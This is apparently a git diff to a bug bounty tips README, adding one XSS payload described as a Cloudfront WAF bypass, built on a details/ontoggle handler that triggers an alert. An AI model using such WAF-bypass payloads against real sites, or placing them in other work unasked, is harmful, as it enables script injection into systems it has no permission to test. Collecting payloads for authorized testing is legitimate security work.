@@ -5,6 +5,11 @@ This repository stores and houses various one-liner for bug bounty tips provided
 
 ---
 
+### XSS Bypass Cloudfront WAF
+```html
+x"><--<img src= "><details/open/ontoggle=alert(`mindbl0w@bugcrodninja.com`)>> --!>=
+```
+
 ### Local File Inclusion
 > @dwisiswant0
 
